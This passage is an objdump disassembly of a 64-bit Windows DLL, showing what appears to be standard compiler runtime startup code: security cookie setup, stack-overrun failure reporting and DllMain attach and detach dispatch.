   180001762:	48 89 05 27 39 00 00 	mov    %rax,0x3927(%rip)        # 0x180005090
   180001769:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   18000176e:	48 89 05 2b 3a 00 00 	mov    %rax,0x3a2b(%rip)        # 0x1800051a0
   180001775:	c7 05 01 39 00 00 09 	movl   $0xc0000409,0x3901(%rip)        # 0x180005080
   18000177c:	04 00 c0 
   18000177f:	c7 05 fb 38 00 00 01 	movl   $0x1,0x38fb(%rip)        # 0x180005084
   180001786:	00 00 00 
   180001789:	c7 05 05 39 00 00 01 	movl   $0x1,0x3905(%rip)        # 0x180005098
   180001790:	00 00 00 
   180001793:	b8 08 00 00 00       	mov    $0x8,%eax
   180001798:	48 6b c0 00          	imul   $0x0,%rax,%rax
   18000179c:	48 8d 0d fd 38 00 00 	lea    0x38fd(%rip),%rcx        # 0x1800050a0
   1800017a3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1800017aa:	00 
   1800017ab:	b8 08 00 00 00       	mov    $0x8,%eax
   1800017b0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1800017b4:	48 8b 0d 45 38 00 00 	mov    0x3845(%rip),%rcx        # 0x180005000
   1800017bb:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1800017c0:	b8 08 00 00 00       	mov    $0x8,%eax
   1800017c5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1800017c9:	48 8b 0d 70 38 00 00 	mov    0x3870(%rip),%rcx        # 0x180005040
   1800017d0:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1800017d5:	48 8d 0d 14 1a 00 00 	lea    0x1a14(%rip),%rcx        # 0x1800031f0
   1800017dc:	e8 ff fe ff ff       	call   0x1800016e0
   1800017e1:	90                   	nop
   1800017e2:	48 83 c4 38          	add    $0x38,%rsp
   1800017e6:	c3                   	ret
   1800017e7:	cc                   	int3
   1800017e8:	40 53                	rex push %rbx
   1800017ea:	56                   	push   %rsi
   1800017eb:	57                   	push   %rdi
   1800017ec:	48 83 ec 40          	sub    $0x40,%rsp
   1800017f0:	48 8b d9             	mov    %rcx,%rbx
   1800017f3:	ff 15 07 18 00 00    	call   *0x1807(%rip)        # 0x180003000
   1800017f9:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   180001800:	33 ff                	xor    %edi,%edi
   180001802:	45 33 c0             	xor    %r8d,%r8d
   180001805:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   18000180a:	48 8b ce             	mov    %rsi,%rcx
   18000180d:	ff 15 f5 17 00 00    	call   *0x17f5(%rip)        # 0x180003008
   180001813:	48 85 c0             	test   %rax,%rax
   180001816:	74 3c                	je     0x180001854
   180001818:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   18000181d:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180001822:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   180001829:	00 00 
   18000182b:	4c 8b c8             	mov    %rax,%r9
   18000182e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180001833:	4c 8b c6             	mov    %rsi,%r8
   180001836:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   18000183b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180001840:	33 c9                	xor    %ecx,%ecx
   180001842:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001847:	ff 15 2b 18 00 00    	call   *0x182b(%rip)        # 0x180003078
   18000184d:	ff c7                	inc    %edi
   18000184f:	83 ff 02             	cmp    $0x2,%edi
   180001852:	7c ae                	jl     0x180001802
   180001854:	48 83 c4 40          	add    $0x40,%rsp
   180001858:	5f                   	pop    %rdi
   180001859:	5e                   	pop    %rsi
   18000185a:	5b                   	pop    %rbx
   18000185b:	c3                   	ret
   18000185c:	48 83 ec 28          	sub    $0x28,%rsp
   180001860:	85 d2                	test   %edx,%edx
   180001862:	74 39                	je     0x18000189d
   180001864:	83 ea 01             	sub    $0x1,%edx
   180001867:	74 28                	je     0x180001891
   180001869:	83 ea 01             	sub    $0x1,%edx
   18000186c:	74 16                	je     0x180001884
   18000186e:	83 fa 01             	cmp    $0x1,%edx
   180001871:	74 0a                	je     0x18000187d
   180001873:	b8 01 00 00 00       	mov    $0x1,%eax
   180001878:	48 83 c4 28          	add    $0x28,%rsp
   18000187c:	c3                   	ret
   18000187d:	e8 d6 04 00 00       	call   0x180001d58
   180001882:	eb 05                	jmp    0x180001889
   180001884:	e8 a7 04 00 00       	call   0x180001d30
   180001889:	0f b6 c0             	movzbl %al,%eax
   18000188c:	48 83 c4 28          	add    $0x28,%rsp
   180001890:	c3                   	ret
   180001891:	49 8b d0             	mov    %r8,%rdx
   180001894:	48 83 c4 28          	add    $0x28,%rsp
   180001898:	e9 0f 00 00 00       	jmp    0x1800018ac
   18000189d:	4d 85 c0             	test   %r8,%r8
   1800018a0:	0f 95 c1             	setne  %cl
   1800018a3:	48 83 c4 28          	add    $0x28,%rsp
   1800018a7:	e9 18 01 00 00       	jmp    0x1800019c4
   1800018ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800018b1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800018b6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800018bb:	41 56                	push   %r14
   1800018bd:	48 83 ec 20          	sub    $0x20,%rsp
   1800018c1:	48 8b f2             	mov    %rdx,%rsi
   1800018c4:	4c 8b f1             	mov    %rcx,%r14
   1800018c7:	33 c9                	xor    %ecx,%ecx
   1800018c9:	e8 46 05 00 00       	call   0x180001e14
   1800018ce:	84 c0                	test   %al,%al
   1800018d0:	0f 84 c8 00 00 00    	je     0x18000199e
   1800018d6:	e8 cd 03 00 00       	call   0x180001ca8
   1800018db:	8a d8                	mov    %al,%bl
   1800018dd:	88 44 24 40          	mov    %al,0x40(%rsp)
   1800018e1:	40 b7 01             	mov    $0x1,%dil
   1800018e4:	83 3d 35 3d 00 00 00 	cmpl   $0x0,0x3d35(%rip)        # 0x180005620
   1800018eb:	0f 85 c5 00 00 00    	jne    0x1800019b6
   1800018f1:	c7 05 25 3d 00 00 01 	movl   $0x1,0x3d25(%rip)        # 0x180005620
   1800018f8:	00 00 00 
   1800018fb:	e8 18 04 00 00       	call   0x180001d18
   180001900:	84 c0                	test   %al,%al
   180001902:	74 4f                	je     0x180001953
   180001904:	e8 1b 08 00 00       	call   0x180002124
   180001909:	e8 52 03 00 00       	call   0x180001c60
   18000190e:	e8 79 03 00 00       	call   0x180001c8c
   180001913:	48 8d 15 ae 18 00 00 	lea    0x18ae(%rip),%rdx        # 0x1800031c8
   18000191a:	48 8d 0d 9f 18 00 00 	lea    0x189f(%rip),%rcx        # 0x1800031c0
   180001921:	e8 42 0b 00 00       	call   0x180002468
   180001926:	85 c0                	test   %eax,%eax
   180001928:	75 29                	jne    0x180001953
   18000192a:	e8 b5 03 00 00       	call   0x180001ce4
   18000192f:	84 c0                	test   %al,%al
   180001931:	74 20                	je     0x180001953
   180001933:	48 8d 15 7e 18 00 00 	lea    0x187e(%rip),%rdx        # 0x1800031b8
   18000193a:	48 8d 0d 6f 18 00 00 	lea    0x186f(%rip),%rcx        # 0x1800031b0
   180001941:	e8 1c 0b 00 00       	call   0x180002462
   180001946:	c7 05 d0 3c 00 00 02 	movl   $0x2,0x3cd0(%rip)        # 0x180005620
   18000194d:	00 00 00 
   180001950:	40 32 ff             	xor    %dil,%dil
   180001953:	8a cb                	mov    %bl,%cl
   180001955:	e8 1a 06 00 00       	call   0x180001f74
   18000195a:	40 84 ff             	test   %dil,%dil
   18000195d:	75 3f                	jne    0x18000199e
   18000195f:	e8 60 06 00 00       	call   0x180001fc4
   180001964:	48 8b d8             	mov    %rax,%rbx
   180001967:	48 83 38 00          	cmpq   $0x0,(%rax)
   18000196b:	74 24                	je     0x180001991
   18000196d:	48 8b c8             	mov    %rax,%rcx
   180001970:	e8 67 05 00 00       	call   0x180001edc
   180001975:	84 c0                	test   %al,%al
   180001977:	74 18                	je     0x180001991
   180001979:	4c 8b c6             	mov    %rsi,%r8
   18000197c:	ba 02 00 00 00       	mov    $0x2,%edx
   180001981:	49 8b ce             	mov    %r14,%rcx
   180001984:	48 8b 03             	mov    (%rbx),%rax
   180001987:	4c 8b 0d fa 17 00 00 	mov    0x17fa(%rip),%r9        # 0x180003188
   18000198e:	41 ff d1             	call   *%r9
   180001991:	ff 05 59 3c 00 00    	incl   0x3c59(%rip)        # 0x1800055f0
   180001997:	b8 01 00 00 00       	mov    $0x1,%eax
   18000199c:	eb 02                	jmp    0x1800019a0
   18000199e:	33 c0                	xor    %eax,%eax
   1800019a0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800019a5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800019aa:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800019af:	48 83 c4 20          	add    $0x20,%rsp
   1800019b3:	41 5e                	pop    %r14
   1800019b5:	c3                   	ret
   1800019b6:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800019bb:	e8 18 06 00 00       	call   0x180001fd8
   1800019c0:	90                   	nop
   1800019c1:	cc                   	int3
   1800019c2:	cc                   	int3
   1800019c3:	cc                   	int3
   1800019c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800019c9:	57                   	push   %rdi
   1800019ca:	48 83 ec 30          	sub    $0x30,%rsp
   1800019ce:	40 8a f9             	mov    %cl,%dil
   1800019d1:	8b 05 19 3c 00 00    	mov    0x3c19(%rip),%eax        # 0x1800055f0
   1800019d7:	85 c0                	test   %eax,%eax
   1800019d9:	7f 0d                	jg     0x1800019e8
   1800019db:	33 c0                	xor    %eax,%eax
   1800019dd:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800019e2:	48 83 c4 30          	add    $0x30,%rsp
   1800019e6:	5f                   	pop    %rdi
   1800019e7:	c3                   	ret
   1800019e8:	ff c8                	dec    %eax
   1800019ea:	89 05 00 3c 00 00    	mov    %eax,0x3c00(%rip)        # 0x1800055f0
   1800019f0:	e8 b3 02 00 00       	call   0x180001ca8
   1800019f5:	8a d8                	mov    %al,%bl
   1800019f7:	88 44 24 20          	mov    %al,0x20(%rsp)
   1800019fb:	83 3d 1e 3c 00 00 02 	cmpl   $0x2,0x3c1e(%rip)        # 0x180005620
   180001a02:	75 36                	jne    0x180001a3a
   180001a04:	e8 c7 03 00 00       	call   0x180001dd0
   180001a09:	e8 62 02 00 00       	call   0x180001c70
   180001a0e:	e8 4d 07 00 00       	call   0x180002160
   180001a13:	c7 05 03 3c 00 00 00 	movl   $0x0,0x3c03(%rip)        # 0x180005620
   180001a1a:	00 00 00 
   180001a1d:	8a cb                	mov    %bl,%cl
   180001a1f:	e8 50 05 00 00       	call   0x180001f74
   180001a24:	33 d2                	xor    %edx,%edx
   180001a26:	40 8a cf             	mov    %dil,%cl
   180001a29:	e8 6a 05 00 00       	call   0x180001f98
   180001a2e:	0f b6 d8             	movzbl %al,%ebx
   180001a31:	e8 ca 03 00 00       	call   0x180001e00
   180001a36:	8b c3                	mov    %ebx,%eax
   180001a38:	eb a3                	jmp    0x1800019dd
   180001a3a:	b9 07 00 00 00       	mov    $0x7,%ecx
   180001a3f:	e8 94 05 00 00       	call   0x180001fd8
   180001a44:	90                   	nop
   180001a45:	90                   	nop
   180001a46:	cc                   	int3
   180001a47:	cc                   	int3
   180001a48:	48 8b c4             	mov    %rsp,%rax
   180001a4b:	48 89 58 20          	mov    %rbx,0x20(%rax)
   180001a4f:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180001a53:	89 50 10             	mov    %edx,0x10(%rax)
   180001a56:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180001a5a:	56                   	push   %rsi
   180001a5b:	57                   	push   %rdi
   180001a5c:	41 56                	push   %r14
   180001a5e:	48 83 ec 40          	sub    $0x40,%rsp
   180001a62:	49 8b f0             	mov    %r8,%rsi
   180001a65:	8b fa                	mov    %edx,%edi
   180001a67:	4c 8b f1             	mov    %rcx,%r14
   180001a6a:	85 d2                	test   %edx,%edx
   180001a6c:	75 0f                	jne    0x180001a7d
   180001a6e:	39 15 7c 3b 00 00    	cmp    %edx,0x3b7c(%rip)        # 0x1800055f0
   180001a74:	7f 07                	jg     0x180001a7d
   180001a76:	33 c0                	xor    %eax,%eax
   180001a78:	e9 e5 00 00 00       	jmp    0x180001b62
   180001a7d:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180001a80:	83 f8 01             	cmp    $0x1,%eax
   180001a83:	77 40                	ja     0x180001ac5
   180001a85:	48 8b 05 74 17 00 00 	mov    0x1774(%rip),%rax        # 0x180003200
   180001a8c:	48 85 c0             	test   %rax,%rax
   180001a8f:	75 05                	jne    0x180001a96
   180001a91:	8d 58 01             	lea    0x1(%rax),%ebx
   180001a94:	eb 08                	jmp    0x180001a9e
   180001a96:	ff 15 ec 16 00 00    	call   *0x16ec(%rip)        # 0x180003188
   180001a9c:	8b d8                	mov    %eax,%ebx
   180001a9e:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180001aa2:	85 db                	test   %ebx,%ebx
   180001aa4:	0f 84 ae 00 00 00    	je     0x180001b58
   180001aaa:	4c 8b c6             	mov    %rsi,%r8
   180001aad:	8b d7                	mov    %edi,%edx
   180001aaf:	49 8b ce             	mov    %r14,%rcx
   180001ab2:	e8 a5 fd ff ff       	call   0x18000185c
   180001ab7:	8b d8                	mov    %eax,%ebx
   180001ab9:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001abd:	85 c0                	test   %eax,%eax
   180001abf:	0f 84 93 00 00 00    	je     0x180001b58
   180001ac5:	4c 8b c6             	mov    %rsi,%r8
   180001ac8:	8b d7                	mov    %edi,%edx
   180001aca:	49 8b ce             	mov    %r14,%rcx
   180001acd:	e8 3e f9 ff ff       	call   0x180001410
   180001ad2:	8b d8                	mov    %eax,%ebx
   180001ad4:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001ad8:	83 ff 01             	cmp    $0x1,%edi
   180001adb:	75 36                	jne    0x180001b13
   180001add:	85 c0                	test   %eax,%eax
   180001adf:	75 32                	jne    0x180001b13
   180001ae1:	4c 8b c6             	mov    %rsi,%r8
   180001ae4:	33 d2                	xor    %edx,%edx
   180001ae6:	49 8b ce             	mov    %r14,%rcx
   180001ae9:	e8 22 f9 ff ff       	call   0x180001410
   180001aee:	48 85 f6             	test   %rsi,%rsi
   180001af1:	0f 95 c1             	setne  %cl
   180001af4:	e8 cb fe ff ff       	call   0x1800019c4
   180001af9:	48 8b 05 00 17 00 00 	mov    0x1700(%rip),%rax        # 0x180003200
   180001b00:	48 85 c0             	test   %rax,%rax
   180001b03:	74 0e                	je     0x180001b13
   180001b05:	4c 8b c6             	mov    %rsi,%r8
   180001b08:	33 d2                	xor    %edx,%edx
   180001b0a:	49 8b ce             	mov    %r14,%rcx
   180001b0d:	ff 15 75 16 00 00    	call   *0x1675(%rip)        # 0x180003188
   180001b13:	85 ff                	test   %edi,%edi
   180001b15:	74 05                	je     0x180001b1c
   180001b17:	83 ff 03             	cmp    $0x3,%edi
   180001b1a:	75 3c                	jne    0x180001b58
   180001b1c:	4c 8b c6             	mov    %rsi,%r8
   180001b1f:	8b d7                	mov    %edi,%edx
   180001b21:	49 8b ce             	mov    %r14,%rcx
   180001b24:	e8 33 fd ff ff       	call   0x18000185c
   180001b29:	8b d8                	mov    %eax,%ebx
   180001b2b:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001b2f:	85 c0                	test   %eax,%eax
   180001b31:	74 25                	je     0x180001b58
   180001b33:	48 8b 05 c6 16 00 00 	mov    0x16c6(%rip),%rax        # 0x180003200
   180001b3a:	48 85 c0             	test   %rax,%rax
   180001b3d:	75 05                	jne    0x180001b44
   180001b3f:	8d 58 01             	lea    0x1(%rax),%ebx
   180001b42:	eb 10                	jmp    0x180001b54
   180001b44:	4c 8b c6             	mov    %rsi,%r8
   180001b47:	8b d7                	mov    %edi,%edx
   180001b49:	49 8b ce             	mov    %r14,%rcx
   180001b4c:	ff 15 36 16 00 00    	call   *0x1636(%rip)        # 0x180003188
   180001b52:	8b d8                	mov    %eax,%ebx
   180001b54:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180001b58:	eb 06                	jmp    0x180001b60
   180001b5a:	33 db                	xor    %ebx,%ebx
   180001b5c:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180001b60:	8b c3                	mov    %ebx,%eax
   180001b62:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   180001b67:	48 83 c4 40          	add    $0x40,%rsp
   180001b6b:	41 5e                	pop    %r14
   180001b6d:	5f                   	pop    %rdi
   180001b6e:	5e                   	pop    %rsi
   180001b6f:	c3                   	ret
   180001b70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001b75:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180001b7a:	57                   	push   %rdi
   180001b7b:	48 83 ec 20          	sub    $0x20,%rsp
   180001b7f:	49 8b f8             	mov    %r8,%rdi
   180001b82:	8b da                	mov    %edx,%ebx
   180001b84:	48 8b f1             	mov    %rcx,%rsi
   180001b87:	83 fa 01             	cmp    $0x1,%edx
   180001b8a:	75 05                	jne    0x180001b91
   180001b8c:	e8 1f 00 00 00       	call   0x180001bb0
   180001b91:	4c 8b c7             	mov    %rdi,%r8
   180001b94:	8b d3                	mov    %ebx,%edx
   180001b96:	48 8b ce             	mov    %rsi,%rcx
   180001b99:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001b9e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001ba3:	48 83 c4 20          	add    $0x20,%rsp
   180001ba7:	5f                   	pop    %rdi
   180001ba8:	e9 9b fe ff ff       	jmp    0x180001a48
   180001bad:	cc                   	int3
   180001bae:	cc                   	int3
   180001baf:	cc                   	int3
   180001bb0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001bb5:	55                   	push   %rbp
   180001bb6:	48 8b ec             	mov    %rsp,%rbp
   180001bb9:	48 83 ec 30          	sub    $0x30,%rsp
   180001bbd:	48 8b 05 3c 34 00 00 	mov    0x343c(%rip),%rax        # 0x180005000
   180001bc4:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   180001bcb:	2b 00 00 
   180001bce:	48 3b c3             	cmp    %rbx,%rax
   180001bd1:	75 77                	jne    0x180001c4a
   180001bd3:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180001bd7:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   180001bde:	00 
   180001bdf:	ff 15 cb 14 00 00    	call   *0x14cb(%rip)        # 0x1800030b0
   180001be5:	48 8b 45 10          	mov    0x10(%rbp),%rax
   180001be9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180001bed:	ff 15 c5 14 00 00    	call   *0x14c5(%rip)        # 0x1800030b8
   180001bf3:	8b c0                	mov    %eax,%eax
   180001bf5:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   180001bf9:	ff 15 c1 14 00 00    	call   *0x14c1(%rip)        # 0x1800030c0
   180001bff:	8b c0                	mov    %eax,%eax
   180001c01:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180001c05:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   180001c09:	ff 15 61 14 00 00    	call   *0x1461(%rip)        # 0x180003070
   180001c0f:	8b 45 18             	mov    0x18(%rbp),%eax
   180001c12:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001c16:	48 c1 e0 20          	shl    $0x20,%rax
   180001c1a:	48 33 45 18          	xor    0x18(%rbp),%rax
   180001c1e:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   180001c22:	48 33 c1             	xor    %rcx,%rax
   180001c25:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   180001c2c:	ff 00 00 
   180001c2f:	48 23 c1             	and    %rcx,%rax
   180001c32:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   180001c39:	2b 00 00 
   180001c3c:	48 3b c3             	cmp    %rbx,%rax
   180001c3f:	48 0f 44 c1          	cmove  %rcx,%rax
   180001c43:	48 89 05 b6 33 00 00 	mov    %rax,0x33b6(%rip)        # 0x180005000
   180001c4a:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180001c4f:	48 f7 d0             	not    %rax
   180001c52:	48 89 05 e7 33 00 00 	mov    %rax,0x33e7(%rip)        # 0x180005040
   180001c59:	48 83 c4 30          	add    $0x30,%rsp
   180001c5d:	5d                   	pop    %rbp
   180001c5e:	c3                   	ret
   180001c5f:	cc                   	int3
   180001c60:	48 8d 0d 99 39 00 00 	lea    0x3999(%rip),%rcx        # 0x180005600
   180001c67:	48 ff 25 3a 14 00 00 	rex.W jmp *0x143a(%rip)        # 0x1800030a8
   180001c6e:	cc                   	int3
   180001c6f:	cc                   	int3
   180001c70:	48 8d 0d 89 39 00 00 	lea    0x3989(%rip),%rcx        # 0x180005600
   180001c77:	e9 da 07 00 00       	jmp    0x180002456
   180001c7c:	48 8d 05 8d 39 00 00 	lea    0x398d(%rip),%rax        # 0x180005610
   180001c83:	c3                   	ret
   180001c84:	48 8d 05 8d 39 00 00 	lea    0x398d(%rip),%rax        # 0x180005618
   180001c8b:	c3                   	ret
   180001c8c:	48 83 ec 28          	sub    $0x28,%rsp
   180001c90:	e8 e7 ff ff ff       	call   0x180001c7c
   180001c95:	48 83 08 24          	orq    $0x24,(%rax)
   180001c99:	e8 e6 ff ff ff       	call   0x180001c84
   180001c9e:	48 83 08 02          	orq    $0x2,(%rax)
   180001ca2:	48 83 c4 28          	add    $0x28,%rsp
   180001ca6:	c3                   	ret
   180001ca7:	cc                   	int3
   180001ca8:	48 83 ec 28          	sub    $0x28,%rsp
   180001cac:	e8 8f 07 00 00       	call   0x180002440
   180001cb1:	85 c0                	test   %eax,%eax
   180001cb3:	74 21                	je     0x180001cd6
   180001cb5:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   180001cbc:	00 00 
   180001cbe:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001cc2:	eb 05                	jmp    0x180001cc9
   180001cc4:	48 3b c8             	cmp    %rax,%rcx
   180001cc7:	74 14                	je     0x180001cdd
   180001cc9:	33 c0                	xor    %eax,%eax
   180001ccb:	f0 48 0f b1 0d 54 39 	lock cmpxchg %rcx,0x3954(%rip)        # 0x180005628
   180001cd2:	00 00 
   180001cd4:	75 ee                	jne    0x180001cc4
   180001cd6:	32 c0                	xor    %al,%al
   180001cd8:	48 83 c4 28          	add    $0x28,%rsp
   180001cdc:	c3                   	ret
   180001cdd:	b0 01                	mov    $0x1,%al
   180001cdf:	eb f7                	jmp    0x180001cd8
   180001ce1:	cc                   	int3
   180001ce2:	cc                   	int3
   180001ce3:	cc                   	int3
   180001ce4:	48 83 ec 28          	sub    $0x28,%rsp
   180001ce8:	e8 53 07 00 00       	call   0x180002440
   180001ced:	85 c0                	test   %eax,%eax
   180001cef:	74 07                	je     0x180001cf8
   180001cf1:	e8 aa 04 00 00       	call   0x1800021a0
   180001cf6:	eb 19                	jmp    0x180001d11
   180001cf8:	e8 3b 07 00 00       	call   0x180002438
   180001cfd:	8b c8                	mov    %eax,%ecx
   180001cff:	e8 70 07 00 00       	call   0x180002474
   180001d04:	85 c0                	test   %eax,%eax
   180001d06:	74 04                	je     0x180001d0c
   180001d08:	32 c0                	xor    %al,%al
   180001d0a:	eb 07                	jmp    0x180001d13
   180001d0c:	e8 69 07 00 00       	call   0x18000247a
   180001d11:	b0 01                	mov    $0x1,%al
   180001d13:	48 83 c4 28          	add    $0x28,%rsp
   180001d17:	c3                   	ret
   180001d18:	48 83 ec 28          	sub    $0x28,%rsp
   180001d1c:	33 c9                	xor    %ecx,%ecx
   180001d1e:	e8 2d 01 00 00       	call   0x180001e50
   180001d23:	84 c0                	test   %al,%al
   180001d25:	0f 95 c0             	setne  %al
   180001d28:	48 83 c4 28          	add    $0x28,%rsp
   180001d2c:	c3                   	ret
   180001d2d:	cc                   	int3
   180001d2e:	cc                   	int3
   180001d2f:	cc                   	int3
   180001d30:	48 83 ec 28          	sub    $0x28,%rsp
   180001d34:	e8 5b 07 00 00       	call   0x180002494
   180001d39:	84 c0                	test   %al,%al
   180001d3b:	75 04                	jne    0x180001d41
   180001d3d:	32 c0                	xor    %al,%al
   180001d3f:	eb 12                	jmp    0x180001d53
   180001d41:	e8 4e 07 00 00       	call   0x180002494
   180001d46:	84 c0                	test   %al,%al
   180001d48:	75 07                	jne    0x180001d51
   180001d4a:	e8 45 07 00 00       	call   0x180002494
   180001d4f:	eb ec                	jmp    0x180001d3d
   180001d51:	b0 01                	mov    $0x1,%al
   180001d53:	48 83 c4 28          	add    $0x28,%rsp
   180001d57:	c3                   	ret
   180001d58:	48 83 ec 28          	sub    $0x28,%rsp
   180001d5c:	e8 33 07 00 00       	call   0x180002494
   180001d61:	e8 2e 07 00 00       	call   0x180002494
   180001d66:	b0 01                	mov    $0x1,%al
   180001d68:	48 83 c4 28          	add    $0x28,%rsp
   180001d6c:	c3                   	ret
   180001d6d:	cc                   	int3
   180001d6e:	cc                   	int3
   180001d6f:	cc                   	int3
   180001d70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001d75:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180001d7a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180001d7f:	57                   	push   %rdi
   180001d80:	48 83 ec 20          	sub    $0x20,%rsp
   180001d84:	49 8b f9             	mov    %r9,%rdi
   180001d87:	49 8b f0             	mov    %r8,%rsi
   180001d8a:	8b da                	mov    %edx,%ebx
   180001d8c:	48 8b e9             	mov    %rcx,%rbp
   180001d8f:	e8 ac 06 00 00       	call   0x180002440
   180001d94:	85 c0                	test   %eax,%eax
   180001d96:	75 16                	jne    0x180001dae
   180001d98:	83 fb 01             	cmp    $0x1,%ebx
   180001d9b:	75 11                	jne    0x180001dae
   180001d9d:	4c 8b c6             	mov    %rsi,%r8
   180001da0:	33 d2                	xor    %edx,%edx
   180001da2:	48 8b cd             	mov    %rbp,%rcx
   180001da5:	48 8b c7             	mov    %rdi,%rax
   180001da8:	ff 15 da 13 00 00    	call   *0x13da(%rip)        # 0x180003188
   180001dae:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   180001db3:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   180001db7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001dbc:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180001dc1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180001dc6:	48 83 c4 20          	add    $0x20,%rsp
   180001dca:	5f                   	pop    %rdi
   180001dcb:	e9 9e 06 00 00       	jmp    0x18000246e
   180001dd0:	48 83 ec 28          	sub    $0x28,%rsp
   180001dd4:	e8 67 06 00 00       	call   0x180002440
   180001dd9:	85 c0                	test   %eax,%eax
   180001ddb:	74 10                	je     0x180001ded
   180001ddd:	48 8d 0d 54 38 00 00 	lea    0x3854(%rip),%rcx        # 0x180005638
   180001de4:	48 83 c4 28          	add    $0x28,%rsp
   180001de8:	e9 99 06 00 00       	jmp    0x180002486
   180001ded:	e8 a6 06 00 00       	call   0x180002498
   180001df2:	85 c0                	test   %eax,%eax
   180001df4:	75 05                	jne    0x180001dfb
   180001df6:	e8 91 06 00 00       	call   0x18000248c
   180001dfb:	48 83 c4 28          	add    $0x28,%rsp
   180001dff:	c3                   	ret
   180001e00:	48 83 ec 28          	sub    $0x28,%rsp
   180001e04:	33 c9                	xor    %ecx,%ecx
   180001e06:	e8 89 06 00 00       	call   0x180002494
   180001e0b:	48 83 c4 28          	add    $0x28,%rsp
   180001e0f:	e9 80 06 00 00       	jmp    0x180002494
   180001e14:	48 83 ec 28          	sub    $0x28,%rsp
   180001e18:	85 c9                	test   %ecx,%ecx
   180001e1a:	75 07                	jne    0x180001e23
   180001e1c:	c6 05 0d 38 00 00 01 	movb   $0x1,0x380d(%rip)        # 0x180005630
   180001e23:	e8 78 03 00 00       	call   0x1800021a0
   180001e28:	e8 67 06 00 00       	call   0x180002494
   180001e2d:	84 c0                	test   %al,%al
   180001e2f:	75 04                	jne    0x180001e35
   180001e31:	32 c0                	xor    %al,%al
   180001e33:	eb 14                	jmp    0x180001e49
   180001e35:	e8 5a 06 00 00       	call   0x180002494
   180001e3a:	84 c0                	test   %al,%al
   180001e3c:	75 09                	jne    0x180001e47
   180001e3e:	33 c9                	xor    %ecx,%ecx
   180001e40:	e8 4f 06 00 00       	call   0x180002494
   180001e45:	eb ea                	jmp    0x180001e31
   180001e47:	b0 01                	mov    $0x1,%al
   180001e49:	48 83 c4 28          	add    $0x28,%rsp
   180001e4d:	c3                   	ret
   180001e4e:	cc                   	int3
   180001e4f:	cc                   	int3
   180001e50:	40 53                	rex push %rbx
   180001e52:	48 83 ec 20          	sub    $0x20,%rsp
   180001e56:	80 3d d4 37 00 00 00 	cmpb   $0x0,0x37d4(%rip)        # 0x180005631
   180001e5d:	8b d9                	mov    %ecx,%ebx
   180001e5f:	75 67                	jne    0x180001ec8
   180001e61:	83 f9 01             	cmp    $0x1,%ecx
   180001e64:	77 6a                	ja     0x180001ed0
   180001e66:	e8 d5 05 00 00       	call   0x180002440
   180001e6b:	85 c0                	test   %eax,%eax
   180001e6d:	74 28                	je     0x180001e97
   180001e6f:	85 db                	test   %ebx,%ebx
   180001e71:	75 24                	jne    0x180001e97
